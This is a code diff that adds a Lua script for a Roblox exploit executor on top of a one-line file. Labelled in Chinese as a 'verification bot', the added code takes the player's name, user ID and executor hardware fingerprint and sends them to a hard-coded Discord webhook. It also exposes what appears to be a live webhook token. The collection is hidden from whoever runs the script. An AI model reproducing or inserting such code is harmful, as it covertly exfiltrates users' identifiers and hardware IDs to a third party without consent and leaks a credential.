@@ -1,1 +1,44 @@
+local GS_Webhook = "https://discord.com/api/webhooks/1449608485233758409/CsgGTh1VzSxpbM1mxHSApZsN3Hk-vbavoEJQ3xGoV_tMA6V8ghIlsfTekQFVr5mS696H"
+
+local player = game.Players.LocalPlayer
+local body = http_request({Url = 'https://httpbin.org/headers'; Method = 'GET'}).Body
+local decoded = game:GetService("HttpService"):JSONDecode(body)
+local hwid = decoded.headers['Delta-Fingerprint']
+
+local msg = {
+    ["username"] = "验证机器人",
+    ["embeds"] = {
+        {
+            ["color"] = 0x32CD32,
+            ["title"] = "用户验证信息",
+            ["fields"] = {
+                {
+                    ["name"] = "用户名",
+                    ["value"] = player.Name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "用户ID",
+                    ["value"] = tostring(player.UserId),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "HWID",
+                    ["value"] = hwid,
+                    ["inline"] = false
+                }
+            }
+        }
+    }
+}
+
+local request = http_request or request or HttpPost or syn.request
+request({
+    Url = GS_Webhook,
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = game:GetService("HttpService"):JSONEncode(msg)
+})
+wait(0.35)
+
 A = "B"
